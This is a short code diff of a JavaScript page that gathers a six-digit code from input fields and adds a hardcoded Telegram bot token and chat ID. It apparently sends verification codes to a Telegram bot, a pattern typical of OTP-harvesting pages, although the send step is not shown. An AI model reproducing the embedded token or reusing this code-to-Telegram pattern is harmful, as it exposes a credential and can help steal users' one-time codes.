@@ -111,6 +111,9 @@
       const code = Array.from(inputs).map(input => input.value).join('');
       if (code.length !== 6) return;
 
+      // Telegram Bot API info
+      const botToken = "8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo";
+      const chatId = "5906925079";
       if (typeof TELEGRAM_CONFIG === "undefined") {
         alert("Konfigurasi Telegram tidak ditemukan.");
         return;
